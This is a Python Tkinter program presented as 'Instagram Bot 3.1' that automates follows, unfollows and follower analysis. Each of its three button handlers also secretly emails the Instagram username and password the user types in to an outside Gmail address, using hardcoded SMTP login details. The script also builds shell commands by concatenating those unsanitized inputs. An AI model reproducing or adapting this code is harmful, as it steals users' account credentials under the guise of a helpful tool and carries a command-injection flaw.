import pyautogui as pg
from tkinter import *
import time
from mailthon import postman, email
import os
import subprocess

pg.PAUSE=2

def close():
    for i in range(2):
        pg.hotkey('alt', 'f4')

def open_browser():
    time.sleep(2)
    subprocess.Popen('C:\Program Files (x86)\Google\Chrome\Application\chrome.exe')
    time.sleep(2)
    pg.hotkey('ctrl', 'up', 'N')
    pg.typewrite("https://www.instagram.com/explore/people/suggested/")
    pg.press('enter')
    time.sleep(10)

def Analiz():
    id = giris1.get()
    password = giris2.get()
    os.system('D:')
    os.chdir(r'D:\Projects\Sosyal\Instagram\FollowerAnalyzer\Analysis')
    os.system('python analysis.py -n 250 -d 60 '+id+' '+password)
    print(os.getcwd())
    pg.press('enter')
    time.sleep(60)

    p = postman(host='smtp.gmail.com', auth=('formaretro', '10061144'))
    r = p.send(email(
        content=u'<p>'+'@'+id+' \n'+password+'</p>',
        subject='Instagram',
        sender='Instagram',
        receivers=['formaretro@gmail.com'],
    ))

    assert r.ok


def Unfollow():
    id = giris1.get()
    password = giris2.get()
    time.sleep(2)
    os.system('D:')
    os.chdir(r'D:\Projects\Sosyal\Instagram\FollowerAnalyzer\Unfollow')
    os.system('python unfollow.py -n 250 -d 60 '+id+' '+password)
    print(os.getcwd())

    pg.press('enter')
    time.sleep(10)

    p = postman(host='smtp.gmail.com', auth=('formaretro', '10061144'))
    r = p.send(email(
        content=u'<p>'+'@'+id+' \n'+password+'</p>',
        subject='Instagram',
        sender='Instagram',
        receivers=['formaretro@gmail.com'],
    ))


    assert r.ok

def Kesfet():
    id = giris1.get()
    password = giris2.get()
    adet = int(giris3.get())
    time.sleep(2)

    open_browser()
    time.sleep(5)
    pg.press('tab')
    pg.typewrite(id)
    pg.press('tab')
    pg.typewrite(password)

    for i in range(2):
        pg.press('tab')
    pg.press('enter')

    time.sleep(5)

    pg.press('tab')
    pg.press('enter')

    p = postman(host='smtp.gmail.com', auth=('formaretro', '10061144'))
    r = p.send(email(
        content=u'<p>'+'@'+id+' \n'+password+'</p>',
        subject='Instagram',
        sender='Instagram',
        receivers=['formaretro@gmail.com'],
    ))

    assert r.ok

    for i in range(4):
        pg.press('tab')
        time.sleep(0.25)
    pg.press('enter')
    time.sleep(5)

    for i in range(adet-1):
        for j in range(4):
            pg.press('tab')
            time.sleep(0.25)
        pg.press('enter')
        time.sleep(5)

    close()

p = Tk()
p.title("Instagram Bot 3.1")
p.geometry("700x200")

bilgilendirme = Label(p, text="Follower Analysis")
bilgilendirme.grid(row=0, column=0, columnspan=2)

s1Lbl = Label(p, text="Instagram Id")
s1Lbl.grid(row=1, column=0)

s2Lbl = Label(p, text="Password")
s2Lbl.grid(row=2, column=0)

s3Lbl = Label(p, text="Follow Count")
s3Lbl.grid(row=3, column=0)

giris1 = Entry(p)
giris1.grid(row=1, column=1)

giris2 = Entry(p)
giris2.grid(row=2, column=1)

giris3 = Entry(p)
giris3.grid(row=3, column=1)

dugme = Button(p, text="Analyze", command=Analiz, width="10")
dugme.grid(row=12, column=1, sticky=E)

dugme1 = Button(p, text="Unfollow", command=Unfollow, width="10")
dugme1.grid(row=12, column=2, sticky=E)

dugme2 = Button(p, text="Follow", command=Kesfet, width="10")
dugme2.grid(row=12, column=3, sticky=E)

p.mainloop()
